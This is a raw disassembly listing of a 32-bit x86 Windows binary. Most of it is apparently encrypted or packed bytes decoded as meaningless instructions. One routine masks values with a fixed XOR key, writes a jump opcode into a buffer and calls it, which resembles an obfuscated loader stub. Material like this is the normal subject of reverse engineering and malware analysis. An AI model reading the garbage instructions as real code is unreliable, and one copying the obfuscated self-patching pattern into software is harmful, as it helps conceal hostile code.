  42f830:	scas   eax,DWORD PTR es:[edi]
  42f831:	loope  0x42f7f0
  42f833:	out    dx,al
  42f834:	mov    dl,0xe6
  42f836:	enter  0xc4ce,0xb6
  42f83a:	sti    
  42f83b:	aad    0xd0
  42f83d:	out    dx,al
  42f83e:	sar    BYTE PTR [ebp+0x5bef5e2],1
  42f844:	cmc    
  42f845:	ret    0xbffa
  42f848:	aad    0xc8
  42f84a:	stc    
  42f84b:	clc    
  42f84c:	out    dx,eax
  42f84d:	int3   
  42f84e:	shl    cl,cl
  42f850:	mov    cl,0xf3
  42f852:	in     eax,0xc6
  42f854:	loope  0x42f851
  42f856:	aad    0xba
  42f858:	shr    BYTE PTR [ebp+0x3f5dbb0],0xde
  42f85f:	clc    
  42f860:	mov    ecx,0xf7c7b8fb
  42f865:	retf   
  42f866:	inc    DWORD PTR [edi]
  42f868:	jmp    0x42f841
  42f86a:	fiadd  DWORD PTR [edi+ebx*8]
  42f86d:	inc    eax
  42f86f:	(bad)  
  42f870:	retf   0xb6a9
  42f873:	scas   al,BYTE PTR es:[edi]
  42f874:	rol    dh,1
  42f876:	in     al,0xfb
  42f878:	cli    
  42f879:	xlat   BYTE PTR ds:[ebx]
  42f87a:	aad    0xf2
  42f87c:	fnstsw WORD PTR [ebx+eax*8-0x1dfe2d0e]
  42f883:	add    ebx,edi
  42f885:	push   es
  42f886:	add    al,0xc4
  42f888:	(bad)
  42f88b:	sti    
  42f88c:	fild   WORD PTR [esi]
  42f88e:	fucomip st,st(0)
  42f890:	out    0xbd,al
  42f892:	div    DWORD PTR [esi-0x194b2b50]
  42f898:	fucomi st,st(7)
  42f89a:	jmp    0xfefd:0xd6f7dcef
  42f8a1:	fadd   DWORD PTR [eax]
  42f8a3:	mov    ebp,0xfed60703
  42f8a8:	aad    0xc9
  42f8aa:	out    dx,eax
  42f8ab:	hlt    
  42f8ac:	loop   0x42f881
  42f8ae:	fsubp  st(3),st
  42f8b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8b1:	(bad)  
  42f8b3:	fadd   st(1),st
  42f8b5:	jecxz  0x42f87d
  42f8b7:	in     eax,dx
  42f8b8:	repz xlat BYTE PTR ds:[ebx]
  42f8ba:	stc    
  42f8bb:	repz mov ch,0xfc
  42f8be:	out    dx,eax
  42f8bf:	add    dh,dl
  42f8c1:	fcmove st,st(6)
  42f8c3:	in     al,dx
  42f8c4:	cmc    
  42f8c5:	jmp    0xe00f:0x6fc01bc
  42f8cc:	hlt    
  42f8cd:	leave  
  42f8ce:	add    ebp,esi
  42f8d0:	ror    dh,cl
  42f8d2:	repnz mov dl,0xc9
  42f8d5:	ret    0xf7c2
  42f8d8:	in     eax,dx
  42f8d9:	shl    DWORD PTR [ebp+0x1eebaf2],1
  42f8df:	jmp    0xbd34e9a2
  42f8e4:	repz (bad) 
  42f8e7:	(bad)  
  42f8e8:	imul   edi
  42f8ea:	or     BYTE PTR [esp+edi*8],al
  42f8ed:	or     edi,ecx
  42f8ef:	out    dx,al
  42f8f0:	test   eax,0xd0eae6e7
  42f8f5:	mov    bh,0xfa
  42f8f7:	imul   BYTE PTR [esi-0x442f2753]
  42f8fd:	cmc    
  42f8fe:	in     al,dx
  42f8ff:	hlt    
  42f900:	jecxz  0x42f8ce
  42f902:	add    al,dh
  42f904:	cmc    
  42f905:	push   es
  42f906:	push   es
  42f907:	add    bh,bh
  42f909:	aam    0x1
  42f90b:	loopne 0x42f913
  42f90d:	lds    edx,FWORD PTR [ecx]
  42f90f:	jmp    0xe3d0:0xcedcadf2
  42f916:	out    dx,al
  42f917:	scas   eax,DWORD PTR es:[edi]
  42f918:	mov    ecx,0xf3c5c8bb
  42f91d:	add    esi,DWORD PTR [eax-0x61f4700]
  42f923:	hlt    
  42f924:	test   BYTE PTR [ecx],0xc4
  42f927:	lock add edi,edi
  42f92a:	add    ch,dh
  42f92c:	retf   0xf30d
  42f92f:	ret    
  42f930:	int    0xcd
  42f932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f933:	in     eax,dx
  42f934:	jmp    0xf3f4d429
  42f939:	enter  0xfad8,0xeb
  42f93d:	mov    cl,0xb9
  42f93f:	mov    edx,0xf5ece207
  42f944:	add    al,0xd6
  42f946:	cmc    
  42f947:	jecxz  0x42f920
  42f949:	std    
  42f94a:	leave  
  42f94b:	jmp    esp
  42f94d:	fimul  WORD PTR [edx]
  42f94f:	mov    edi,0xb3e2d2e3
  42f954:	rcl    bl,cl
  42f956:	lods   al,BYTE PTR ds:[esi]
  42f957:	fadd   st,st(0)
  42f959:	retf   0xceed
  42f95c:	sti    
  42f95d:	iret   
  42f95e:	mov    ebp,0xb8fed2f9
  42f963:	add    ch,ah
  42f965:	in     al,0xc2
  42f967:	loopne 0x42f96f
  42f969:	or     dl,dh
  42f96b:	jmp    0xc927fa76
  42f970:	rcr    ch,1
  42f972:	rol    esp,cl
  42f974:	int3   
  42f975:	ret    0xe8ba
  42f978:	lock shr esi,1
  42f97b:	(bad)  
  42f97c:	jmp    0x42f96a
  42f97e:	int3   
  42f97f:	int3   
  42f980:	jecxz  0x42f965
  42f982:	test   BYTE PTR [esi+edx*8],0x2
  42f986:	in     eax,0xdb
  42f988:	pand   mm5,mm1
  42f98b:	hlt    
  42f98c:	retf   
  42f98d:	repnz fidivr DWORD PTR [ebp-0x364d5258]
  42f994:	fmul   st(4),st
  42f996:	jmp    0xc91dba96
  42f99b:	out    dx,eax
  42f99c:	icebp  
  42f99d:	repnz dec edi
  42f9a0:	ret    
  42f9a1:	aam    0xde
  42f9a3:	hlt    
  42f9a4:	mov    esi,0x2f8bcf9
  42f9a9:	enter  0xe0ef,0xf3
  42f9ad:	in     eax,0xca
  42f9af:	test   al,0xc9
  42f9b1:	fsubr  st(0),st
  42f9b3:	imul   DWORD PTR [edx-0x37481e4e]
  42f9b9:	into   
  42f9ba:	hlt    
  42f9bb:	(bad)  
  42f9bc:	push   DWORD PTR [ecx-0x2d402502]
  42f9c2:	(bad)  
  42f9c4:	std    
  42f9c5:	pop    es
  42f9c6:	rol    BYTE PTR [ebx],0xda
  42f9c9:	(bad)  
  42f9cd:	loop   0x42f997
  42f9cf:	mov    edi,0xafbdb0c9
  42f9d4:	mov    al,0xcd
  42f9d6:	mov    dl,0xc6
  42f9d8:	(bad)  
  42f9da:	in     al,dx
  42f9db:	mov    ah,0x3
  42f9dd:	iret   
  42f9de:	add    ebx,eax
  42f9e0:	mov    edx,0xd10106e1
  42f9e5:	sti    
  42f9e6:	push   es
  42f9e7:	(bad)  
  42f9e9:	sar    al,0x9
  42f9ec:	ret    0xacf
  42f9ef:	call   0xcd04bfdd
  42f9f4:	(bad)
  42f9f7:	int    0xf4
  42f9f9:	(bad)  
  42f9fa:	(bad)  
  42f9fb:	jmp    0xe330f0d9
  42fa00:	clc    
  42fa01:	rcr    al,cl
  42fa03:	aad    0xba
  42fa05:	clc    
  42fa06:	in     al,0xe1
  42fa08:	retf   0xe406
  42fa0b:	fisttp QWORD PTR [edi]
  42fa0d:	jmp    0x42f9f0
  42fa0f:	mov    esp,0xb1b1bee2
  42fa14:	stos   BYTE PTR es:[edi],al
  42fa15:	lock test al,0xcb
  42fa18:	sti    
  42fa19:	mov    ebx,0xebdeccf1
  42fa1e:	loop   0x42fa0c
  42fa20:	mov    eax,0xc6dcf1f5
  42fa25:	loopne 0x42fa2c
  42fa27:	retf   0xfbc7
  42fa2a:	retf   
  42fa2b:	ret    
  42fa2c:	hlt    
  42fa2d:	fcomip st,st(1)
  42fa2f:	scas   al,BYTE PTR es:[edi]
  42fa30:	loope  0x42f9e0
  42fa32:	leave  
  42fa33:	vpinsrw xmm0,xmm7,ebp,0xb0
  42fa38:	in     eax,dx
  42fa39:	xlat   BYTE PTR ds:[ebx]
  42fa3a:	fst    st(0)
  42fa3c:	add    ecx,eax
  42fa3e:	mov    ah,0xd6
  42fa40:	idiv   bl
  42fa42:	mov    esi,0xdef0c1d9
  42fa47:	fsub   st(7),st
  42fa49:	jecxz  0x42fa4d
  42fa4b:	mov    ch,0xdb
  42fa4e:	out    0xaa,eax
  42fa50:	stos   BYTE PTR es:[edi],al
  42fa51:	jecxz  0x42fa31
  42fa53:	shl    bh,0xc2
  42fa56:	div    DWORD PTR [esi-0x4c47191b]
  42fa5c:	int3   
  42fa5d:	xlat   BYTE PTR ds:[ebx]
  42fa5e:	ret    
  42fa5f:	mov    edx,0xf702edd0
  42fa64:	(bad)  
  42fa65:	fnclex 
  42fa67:	out    0xd8,eax
  42fa69:	mov    ebp,0xf80befe4
  42fa6e:	rol    esp,cl
  42fa70:	mov    esi,0xf4c9e1f1
  42fa76:	mov    edx,0xd6e5ede5
  42fa7b:	bnd call 0xb705c47f
  42fa81:	jecxz  0x42fa85
  42fa83:	add    eax,0xc0fbd001
  42fa88:	xlat   BYTE PTR ds:[ebx]
  42fa89:	les    ecx,FWORD PTR ds:0xe3dced04
  42fa8f:	retf   0xc5b0
  42fa92:	mov    dl,0xad
  42fa94:	loope  0x42fa63
  42fa96:	stc    
  42fa97:	fcmovb st,st(5)
  42fa99:	cli    
  42fa9a:	std    
  42fa9b:	(bad)  
  42fa9c:	jmp    0xe7de:0xb9bec8ea
  42faa3:	in     al,0xe2
  42faa5:	push   es
  42faa6:	test   bl,0xf
  42faa9:	(bad)  
  42faab:	out    0xc8,eax
  42faad:	jecxz  0x42fa77
  42faaf:	ror    ebx,0xdf
  42fab2:	mov    esp,0xb1b5cdee
  42fab7:	icebp  
  42fab8:	mov    ecx,0xcdf0bab4
  42fabd:	stc    
  42fabe:	(bad)  
  42fabf:	hlt    
  42fac0:	fld    DWORD PTR [ecx]
  42fac2:	std    
  42fac3:	cld    
  42fac4:	mov    esp,0xd408fbd8
  42fac9:	jmp    0x42fada
  42facb:	fsubr  st,st(1)
  42facd:	or     al,0xc9
  42facf:	(bad)  
  42fad0:	repnz retf 
  42fad2:	in     al,dx
  42fad3:	lock scas al,BYTE PTR es:[edi]
  42fad5:	jecxz  0x42faa3
  42fad7:	fcmovnb st,st(0)
  42fad9:	sti    
  42fada:	repz (bad) 
  42fadd:	xlat   BYTE PTR ds:[ebx]
  42fade:	fld    DWORD PTR [ebx]
  42fae0:	(bad)  
  42fae1:	add    esp,esi
  42fae3:	add    eax,0xfbfff8be
  42fae8:	or     ebx,eax
  42faea:	add    eax,DWORD PTR [ebx]
  42faec:	or     eax,0xf3f3df0f
  42faf1:	(bad)
  42faf4:	mov    al,0xec
  42faf6:	div    eax
  42faf8:	rcr    eax,cl
  42fafa:	in     eax,0xe5
  42fafc:	shl    ecx,cl
  42fafe:	fstp   TBYTE PTR [edx-0x50b301f]
  42fb04:	add    eax,0xc8f6d1fc
  42fb09:	stc    
  42fb0a:	fadd   QWORD PTR [edi]
  42fb0c:	hlt    
  42fb0d:	std    
  42fb0e:	add    cl,cl
  42fb10:	icebp  
  42fb11:	(bad)  
  42fb13:	cmc    
  42fb14:	int    0xf4
  42fb16:	div    BYTE PTR [eax-0x2e12194c]
  42fb1c:	mov    esp,0xb6d9eff0
  42fb21:	ret    0xf5f5
  42fb24:	mov    al,0xf2
  42fb27:	cli    
  42fb28:	leave  
  42fb29:	stc    
  42fb2a:	(bad)  
  42fb2c:	ret    0xceca
  42fb2f:	lods   eax,DWORD PTR ds:[esi]
  42fb30:	xlat   BYTE PTR ds:[ebx]
  42fb31:	retf   
  42fb32:	in     al,dx
  42fb33:	xlat   BYTE PTR ds:[ebx]
  42fb34:	hlt    
  42fb35:	mov    esp,0xf5dfe9ce
  42fb3b:	xlat   BYTE PTR ds:[ebx]
  42fb3c:	fcmovnb st,st(3)
  42fb3e:	jmp    0xbe30d8fa
  42fb43:	fsubrp st(1),st
  42fb45:	aad    0xfe
  42fb47:	shl    esp,0xdc
  42fb4a:	sar    ah,0xc9
  42fb4d:	out    0x5,al
  42fb4f:	mov    ecx,0xbcd1e3a6
  42fb54:	retf   
  42fb55:	test   eax,0xccf2e6f9
  42fb5a:	mov    edx,0xf5b4f1f7
  42fb5f:	icebp  
  42fb60:	cli    
  42fb61:	shl    dh,cl
  42fb63:	int3   
  42fb64:	hlt    
  42fb65:	in     eax,0x6
  42fb67:	pop    es
  42fb68:	clc    
  42fb69:	in     eax,0xcb
  42fb6b:	add    al,0xd9
  42fb6d:	call   0xf425a775
  42fb72:	jmp    0xc92bac46
  42fb77:	(bad)  
  42fb78:	out    dx,al
  42fb79:	call   0xd046c54c
  42fb7e:	ret    0xbfdf
  42fb81:	shl    ebx,0xbb
  42fb84:	not    ebp
  42fb86:	clc    
  42fb87:	retf   
  42fb88:	leave  
  42fb89:	stc    
  42fb8a:	in     eax,dx
  42fb8b:	(bad)  
  42fb8c:	fdivr  st,st(4)
  42fb8e:	or     ah,bl
  42fb90:	jmp    0xf2f3e976
  42fb95:	enter  0xedd3,0xec
  42fb99:	(bad)  
  42fb9a:	std    
  42fb9b:	mov    dh,0xd2
  42fb9d:	ffreep st(3)
  42fb9f:	mov    bh,0xdd
  42fba1:	clc    
  42fba2:	into   
  42fba3:	inc    dl
  42fba5:	lock add al,0xd8
  42fba8:	loopne 0x42fb80
  42fbaa:	(bad)  
  42fbab:	(bad)  
  42fbad:	add    eax,0xedeccc0e
  42fbb2:	loopne 0x42fb6a
  42fbb4:	shl    bl,cl
  42fbb6:	in     al,0x8b
  42fbb8:	dec    ebp
  42fbb9:	int3   
  42fbba:	mov    DWORD PTR [ecx],eax
  42fbbc:	lea    eax,[ebp-0x20]
  42fbbf:	mov    DWORD PTR [ebp-0x1c],eax
  42fbc2:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbc5:	mov    eax,DWORD PTR [eax]
  42fbc7:	mov    ecx,DWORD PTR [ebp-0x20]
  42fbca:	sub    eax,ecx
  42fbcc:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbcf:	mov    DWORD PTR [ecx],eax
  42fbd1:	mov    eax,DWORD PTR [ebp-0x38]
  42fbd4:	xor    eax,0x75108b5
  42fbd9:	add    eax,0x3272fb
  42fbde:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbe1:	mov    ecx,DWORD PTR [ecx]
  42fbe3:	or     ecx,eax
  42fbe5:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbe8:	mov    DWORD PTR [eax],ecx
  42fbea:	lea    eax,[ebp-0x30]
  42fbed:	mov    DWORD PTR [ebp-0x94],eax
  42fbf3:	mov    eax,DWORD PTR [ebp-0x94]
  42fbf9:	mov    eax,DWORD PTR [eax]
  42fbfb:	mov    ecx,DWORD PTR [ebp-0x30]
  42fbfe:	sub    eax,ecx
  42fc00:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc06:	mov    DWORD PTR [ecx],eax
  42fc08:	mov    eax,DWORD PTR [ebp-0x94]
  42fc0e:	mov    eax,DWORD PTR [eax]
  42fc10:	or     eax,0xf89c85bf
  42fc15:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc1b:	mov    DWORD PTR [ecx],eax
  42fc1d:	mov    eax,DWORD PTR [ebp-0x10]
  42fc20:	xor    eax,0x75108b5
  42fc25:	add    eax,0x3272fb
  42fc2a:	push   eax
  42fc2b:	mov    eax,DWORD PTR [ebp-0x4]
  42fc2e:	xor    eax,0x75108b5
  42fc33:	add    eax,0x3272fb
  42fc38:	push   eax
  42fc39:	mov    eax,DWORD PTR [ebp-0x30]
  42fc3c:	xor    eax,0x75108b5
  42fc41:	add    eax,0x3272ff
  42fc46:	push   eax
  42fc47:	lea    eax,[ebp-0x88]
  42fc4d:	push   eax
  42fc4e:	push   DWORD PTR [ebp-0x38]
  42fc51:	push   DWORD PTR [ebp-0x90]
  42fc57:	call   0x415490
  42fc5c:	test   eax,eax
  42fc5e:	je     0x42fc98
  42fc64:	lea    eax,[ebp-0x88]
  42fc6a:	push   eax
  42fc6b:	mov    eax,DWORD PTR [ebp-0x90]
  42fc71:	xor    eax,0x75108b5
  42fc76:	add    eax,0x3272fb
  42fc7b:	push   eax
  42fc7c:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc7f:	add    eax,0xaa
  42fc84:	push   eax
  42fc85:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc88:	mov    eax,DWORD PTR [eax+0x198]
  42fc8e:	push   DWORD PTR [eax]
  42fc90:	call   0x40d347
  42fc95:	mov    DWORD PTR [ebp-0xc],eax
  42fc98:	lea    eax,[ebp+0x4]
  42fc9b:	mov    ecx,DWORD PTR ds:0x437497
  42fca1:	mov    DWORD PTR [ecx*4+0x43748f],eax
  42fca8:	mov    eax,ds:0x437497
  42fcad:	inc    eax
  42fcae:	mov    ds:0x437497,eax
  42fcb3:	mov    eax,DWORD PTR [ebp-0xc]
  42fcb6:	sub    eax,0x3272fb
  42fcbb:	xor    eax,0x75108b5
  42fcc0:	cmp    eax,0xf89c85b0
  42fcc5:	jne    0x42fcd5
  42fccb:	jmp    0x42fd86
  42fcd0:	jmp    0x42fd86
  42fcd5:	lea    eax,[ebp-0x9c]
  42fcdb:	mov    DWORD PTR [ebp-0x98],eax
  42fce1:	lea    eax,[ebp-0x98]
  42fce7:	mov    DWORD PTR [ebp-0xa0],eax
  42fced:	mov    eax,DWORD PTR [ebp-0x3c]
  42fcf0:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fcf6:	mov    ecx,DWORD PTR [ecx]
  42fcf8:	mov    DWORD PTR [ecx],eax
  42fcfa:	mov    eax,DWORD PTR [ebp-0xc]
  42fcfd:	mov    ecx,DWORD PTR [ebp-0x98]
  42fd03:	mov    ecx,DWORD PTR [ecx]
  42fd05:	sub    ecx,eax
  42fd07:	mov    eax,DWORD PTR [ebp-0x98]
  42fd0d:	mov    DWORD PTR [eax],ecx
  42fd0f:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd15:	mov    eax,DWORD PTR [eax]
  42fd17:	mov    ecx,DWORD PTR [ebp-0x30]
  42fd1a:	xor    ecx,0x75108b5
  42fd20:	add    ecx,0x3272fb
  42fd26:	mov    eax,DWORD PTR [eax]
  42fd28:	sub    eax,ecx
  42fd2a:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fd30:	mov    ecx,DWORD PTR [ecx]
  42fd32:	mov    DWORD PTR [ecx],eax
  42fd34:	mov    eax,DWORD PTR [ebp-0xc]
  42fd37:	mov    DWORD PTR [eax],0x657664e9
  42fd3d:	mov    DWORD PTR [eax+0x4],0x86787677
  42fd44:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd4a:	mov    eax,DWORD PTR [eax]
  42fd4c:	mov    eax,DWORD PTR [eax]
  42fd4e:	mov    ecx,DWORD PTR [ebp-0xc]
  42fd51:	mov    DWORD PTR [ecx+0x1],eax
  42fd54:	push   DWORD PTR [ebp-0x2c]
  42fd57:	mov    eax,ds:0x437463
  42fd5c:	mov    eax,DWORD PTR [eax]
  42fd5e:	push   DWORD PTR [eax]
  42fd60:	push   DWORD PTR ds:0x43747f
  42fd66:	push   DWORD PTR ds:0x437223
  42fd6c:	push   DWORD PTR ds:0x43745f
  42fd72:	push   DWORD PTR ds:0x437503
  42fd78:	push   DWORD PTR [ebp-0x90]
  42fd7e:	push   DWORD PTR [ebp-0x38]
  42fd81:	mov    eax,DWORD PTR [ebp-0xc]
  42fd84:	call   eax
  42fd86:	leave  
  42fd87:	ret    0x10
	...
  42fd92:	add    BYTE PTR [eax],al
  42fd94:	pop    ds
  42fd95:	or     al,0xaa
  42fd97:	dec    ebp
  42fd98:	add    BYTE PTR [eax],al
  42fd9a:	add    BYTE PTR [eax],al
  42fd9c:	add    al,BYTE PTR [eax]
  42fd9e:	add    BYTE PTR [eax],al
  42fda0:	add    BYTE PTR ss:[eax],al
  42fda3:	add    BYTE PTR [eax-0x4ffffd03],dh
  42fda9:	icebp  
  42fdaa:	add    al,BYTE PTR [eax]
  42fdac:	add    BYTE PTR [eax],al
  42fdae:	add    BYTE PTR [eax],al
  42fdb0:	push   edx
  42fdb1:	push   ebx
  42fdb2:	inc    esp
  42fdb3:	push   ebx
  42fdb4:	jo     0x42fdcc
  42fdb6:	jecxz  0x42fdd2
  42fdb8:	test   BYTE PTR [ecx],bh
  42fdba:	stos   BYTE PTR es:[edi],al
  42fdbb:	dec    edi
  42fdbc:	mov    bh,0x4e
  42fdbe:	mov    BYTE PTR [ecx+0xe56a4c3],ch
  42fdc4:	add    DWORD PTR [eax],eax
  42fdc6:	add    BYTE PTR [eax],al
  42fdc8:	inc    ebx
  42fdc9:	cmp    bl,BYTE PTR [eax+ecx*2+0x65]
  42fdcd:	ins    BYTE PTR es:[edi],dx
  42fdce:	ins    BYTE PTR es:[edi],dx
  42fdcf:	outs   dx,DWORD PTR ds:[esi]
  42fdd0:	pop    esp
  42fdd1:	dec    ecx
  42fdd2:	outs   dx,BYTE PTR ds:[esi]
  42fdd3:	jae    0x42fe3a
  42fdd5:	jb     0x42fe4b
  42fdd7:	pop    esp
  42fdd8:	inc    esp
  42fdd9:	popa   
  42fdda:	je     0x42fe3d
  42fddc:	pop    esp
  42fddd:	inc    esi
  42fdde:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x657865
	...
  42fdf2:	add    BYTE PTR [eax],al
  42fdf4:	pop    ds
  42fdf5:	or     al,0xaa
  42fdf7:	dec    ebp
  42fdf8:	add    BYTE PTR [eax],al
  42fdfa:	add    BYTE PTR [eax],al
  42fdfc:	and    bh,dh
  42fdfe:	add    al,BYTE PTR [eax]
  42fe00:	add    DWORD PTR [eax],eax
  42fe02:	add    BYTE PTR [eax],al
  42fe04:	add    DWORD PTR [eax],eax
  42fe06:	add    BYTE PTR [eax],al
  42fe08:	add    DWORD PTR [eax],eax
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	sbb    dh,bh
  42fe0e:	add    al,BYTE PTR [eax]
  42fe10:	sbb    al,0xfe
  42fe12:	add    al,BYTE PTR [eax]
  42fe14:	and    dh,bh
  42fe16:	add    al,BYTE PTR [eax]
  42fe18:	mov    ds:0x3200001a,eax
  42fe1d:	inc    BYTE PTR [edx]
  42fe1f:	add    BYTE PTR [eax],al
  42fe21:	add    BYTE PTR [ebx+0x65],dl
  42fe24:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  42fe28:	outs   dx,BYTE PTR ds:[esi]
  42fe29:	inc    esp
  42fe2a:	popa   
  42fe2b:	je     0x42fe8e
  42fe2d:	pop    edi
  42fe2e:	inc    ebp
  42fe2f:	js     0x42fea1
  42fe31:	add    BYTE PTR [edi+0x49],bl
  42fe34:	jae    0x42fe8d
  42fe36:	outs   dx,DWORD PTR ds:[esi]
  42fe37:	ja     0x42fe6f
  42fe39:	xor    al,0x4d
  42fe3b:	gs jae 0x42feb1
  42fe3e:	popa   
  42fe3f:	addr16 gs dec ecx
  42fe42:	jae    0x42fe9b
  42fe44:	outs   dx,DWORD PTR ds:[esi]
  42fe45:	ja     0x42fe7d
  42fe47:	xor    al,0x4d
  42fe49:	gs jae 0x42febf
  42fe4c:	popa   
  42fe4d:	addr16 gs inc eax
  42fe50:	xor    BYTE PTR [eax],al
  42fe52:	or     eax,0xc9c964a5
  42fe57:	adc    esi,DWORD PTR [ebp+0x55]
  42fe5a:	pop    ss
  42fe5b:	jne    0x42fec6
  42fe5d:	or     eax,0x61216975
  42fe62:	icebp  
  42fe63:	xchg   edi,eax
  42fe64:	or     eax,0x55ead669
  42fe69:	icebp  
  42fe6a:	xchg   edi,eax
  42fe6b:	or     eax,0xd6bb269
  42fe70:	jne    0x42fe04
  42fe72:	jmp    DWORD PTR [edx+0x750dfa91]
  42fe78:	xchg   bh,bh
  42fe7a:	mov    ds:0x750dfd3a,al
  42fe7f:	xchg   edx,eax
  42fe80:	jmp    DWORD PTR [edx+0x750df33b]
  42fe86:	xchg   edx,eax
  42fe87:	jmp    DWORD PTR [edx+0x22574956]
  42fe8d:	xchg   BYTE PTR [ecx-0x5b],ah
  42fe90:	or     eax,0xd264d664
  42fe95:	pop    edi
  42fe96:	popa   
  42fe97:	popa   
  42fe98:	(bad)  
  42fe99:	jmp    0xb269:0x1e2ad9a
  42fea0:	xchg   ecx,eax
  42fea1:	(bad)  
  42fea2:	jmp    0xe769:0x1e22586
  42fea9:	xor    al,0xf0
  42feab:	mov    cl,0x8d
  42fead:	popa   
  42feae:	popa   
  42feaf:	or     eax,0xe2178e75
  42feb4:	out    0x62,eax
  42feb6:	bound  esp,QWORD PTR [edx+0x14]
  42feb9:	(bad)  
  42febb:	popa   
  42febc:	popa   
  42febd:	xchg   esp,eax
  42febe:	pop    ss
  42febf:	loop   0x42fe5b
  42fec1:	bound  esp,QWORD PTR [edx+0x62]
  42fec4:	adc    al,0x34
  42fec6:	int3   
  42fec7:	popa   
  42fec8:	popa   
  42fec9:	xchg   esp,eax
  42feca:	pop    ss
  42fecb:	loop   0x42fe5d
  42fecd:	bound  esp,QWORD PTR [edx+0x62]
  42fed0:	adc    al,0xdd
  42fed2:	int3   
  42fed3:	popa   
  42fed4:	popa   
  42fed5:	xchg   esp,eax
  42fed6:	pop    ss
  42fed7:	loop   0x42fe5f
  42fed9:	bound  esp,QWORD PTR [edx+0x62]
  42fedc:	adc    al,0xaa
  42fede:	int3   
  42fedf:	popa   
  42fee0:	popa   
  42fee1:	xchg   esp,eax
  42fee2:	pop    ss
  42fee3:	loop   0x42fe71
  42fee5:	bound  esp,QWORD PTR [edx+0x62]
  42fee8:	adc    al,0x7a
  42feea:	int3   
  42feeb:	popa   
  42feec:	popa   
  42feed:	xchg   esp,eax
  42feee:	pop    ss
  42feef:	loop   0x42fe83
  42fef1:	bound  esp,QWORD PTR [edx+0x62]
  42fef4:	adc    al,0xab
  42fef6:	int3   
  42fef7:	popa   
  42fef8:	popa   
  42fef9:	xchg   esp,eax
  42fefa:	pop    ss
  42fefb:	loop   0x42fe85
  42fefd:	bound  esp,QWORD PTR [edx+0x62]
  42ff00:	adc    al,0x17
  42ff02:	shl    DWORD PTR [ecx+0x61],cl
  42ff05:	xchg   esp,eax
  42ff06:	pop    ss
  42ff07:	loop   0x42ff87
  42ff09:	bound  esp,QWORD PTR [edx+0x62]
  42ff0c:	adc    al,0x9e
  42ff0e:	int3   
  42ff0f:	popa   
  42ff10:	popa   
  42ff11:	xchg   esp,eax
  42ff12:	pop    ss
  42ff13:	loop   0x42ff7f
  42ff15:	bound  esp,QWORD PTR [edx+0x62]
  42ff18:	adc    al,0xd
  42ff1a:	shl    DWORD PTR [ecx+0x61],cl
  42ff1d:	xchg   esp,eax
  42ff1e:	pop    ss
  42ff1f:	loop   0x42feab
  42ff21:	bound  esp,QWORD PTR [edx+0x62]
  42ff24:	adc    al,0x85
  42ff26:	int3   
  42ff27:	popa   
  42ff28:	popa   
  42ff29:	xchg   esp,eax
  42ff2a:	pop    ss
  42ff2b:	loop   0x42fead
  42ff2d:	bound  esp,QWORD PTR [edx+0x62]
  42ff30:	adc    al,0x34
  42ff32:	int3   
  42ff33:	popa   
  42ff34:	popa   
  42ff35:	xchg   esp,eax
  42ff36:	pop    ss
  42ff37:	loop   0x42ffaf
  42ff39:	bound  esp,QWORD PTR [edx+0x62]
  42ff3c:	adc    al,0x32
  42ff3e:	int3   
  42ff3f:	popa   
  42ff40:	popa   
  42ff41:	xchg   esp,eax
  42ff42:	pop    ss
  42ff43:	loop   0x42ffc1
  42ff45:	bound  esp,QWORD PTR [edx+0x62]
  42ff48:	adc    al,0xd1
  42ff4a:	jno    0x42ffad
  42ff4c:	popa   
  42ff4d:	xchg   esp,eax
  42ff4e:	pop    ss
  42ff4f:	loop   0x42ff4c
  42ff51:	bound  esp,QWORD PTR [edx+0x62]
  42ff54:	adc    al,0xb1
  42ff56:	and    BYTE PTR [ecx+0x61],0x94
  42ff5a:	pop    ss
  42ff5b:	loop   0x42ffd5
  42ff5d:	bound  esp,QWORD PTR [edx+0x62]
  42ff60:	adc    al,0xac
  42ff62:	cmp    esp,DWORD PTR [ecx+0x61]
  42ff65:	xchg   esp,eax
  42ff66:	pop    ss
  42ff67:	loop   0x42fef7
  42ff69:	bound  esp,QWORD PTR [edx+0x62]
  42ff6c:	adc    al,0x77
  42ff6e:	fbld   TBYTE PTR [ecx+0x61]
  42ff71:	xchg   esp,eax
  42ff72:	pop    ss
  42ff73:	loop   0x42ff49
  42ff75:	bound  esp,QWORD PTR [edx+0x62]
  42ff78:	adc    al,0xa3
  42ff7a:	int3   
  42ff7b:	popa   
  42ff7c:	popa   
  42ff7d:	xchg   esp,eax
  42ff7e:	pop    ss
  42ff7f:	loop   0x42ffb9
  42ff81:	bound  esp,QWORD PTR [edx+0x62]
  42ff84:	adc    al,0xe6
  42ff86:	int3   
  42ff87:	popa   
  42ff88:	popa   
  42ff89:	xchg   esp,eax
  42ff8a:	pop    ss
  42ff8b:	loop   0x42ff5f
  42ff8d:	bound  esp,QWORD PTR [edx+0x62]
  42ff90:	adc    al,0x34
  42ff92:	int3   
  42ff93:	popa   
  42ff94:	popa   
  42ff95:	xchg   esp,eax
  42ff96:	pop    ss
  42ff97:	loop   0x42ff61
  42ff99:	bound  esp,QWORD PTR [edx+0x62]
  42ff9c:	adc    al,0xe3
  42ff9e:	int3   
  42ff9f:	popa   
  42ffa0:	popa   
  42ffa1:	xchg   esp,eax
  42ffa2:	pop    ss
  42ffa3:	loop   0x42ff63
  42ffa5:	bound  esp,QWORD PTR [edx+0x62]
  42ffa8:	adc    al,0xa1
  42ffaa:	int3   
  42ffab:	popa   
  42ffac:	popa   
  42ffad:	xchg   esp,eax
  42ffae:	pop    ss
  42ffaf:	loop   0x42ff55
  42ffb1:	bound  esp,QWORD PTR [edx+0x62]
  42ffb4:	adc    al,0xe5
  42ffb6:	int3   
  42ffb7:	popa   
  42ffb8:	popa   
